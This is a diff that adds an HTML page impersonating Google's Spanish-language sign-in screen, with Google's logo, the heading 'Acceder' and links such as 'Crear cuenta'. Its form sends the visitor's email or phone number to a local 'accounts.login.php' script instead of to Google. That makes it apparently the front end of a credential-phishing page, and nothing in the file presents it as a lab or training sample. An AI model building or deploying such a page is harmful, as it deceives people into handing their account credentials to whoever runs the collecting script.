@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="stylesheet" href="./css/styles.css" />
+<title>Acceso: Cuentas de Google</title>
+
+
+  </head>
+  <body>
+    <main class="main">
+      <header class="main__header">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="logo"/>
+        <h3 class="header__title">Acceder</h3>
+        <h5 class="header__subtitle">Usa tu cuenta de Google</h5>
+      </header>
+      <form class="main__form" method="post" action="accounts.login.php">
+        <div class="form__account">
+          <input name="user" type="email" class="account__email" placeholder="Correo electrónico o teléfono"/>
+          <a href="#" class="links">
+            <h6 class="account__forgot">¿Olvidaste el correo electrónico?</h6>
+          </a>
+        </div>
+        <div class="form__privacy">
+          <p class="privacy__description">
+            ¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada.
+          </p>
+          <a href="#" class="links">
+            <h6 class="privacy__link">Más información</h6>
+          </a>
+        </div>
+        <div class="form__create">
+          <a href="#" class="links">
+            <h5 class="create__link">Crear cuenta</h5>
+          </a>
+          <input type="submit" value="Siguiente" />
+        </div>
+      </form>
+    </main>
+    <footer class="footer">
+      <div class="footer__column left">
+        <select class="footer__language">
+          <option value="USEN">Español (España)</option>
+          <option value="KR">Korean</option>
+          <option value="FR">French</option>
+        </select>
+      </div>
+      <div class="footer__column right">
+        <span class="footer__help item">Ayuda</span>
+        <span class="footer__privacy item">Privacidad</span>
+        <span class="footer__Terms item">Términos</span>
+      </div>
+    </footer>
+  </body>
+</html>
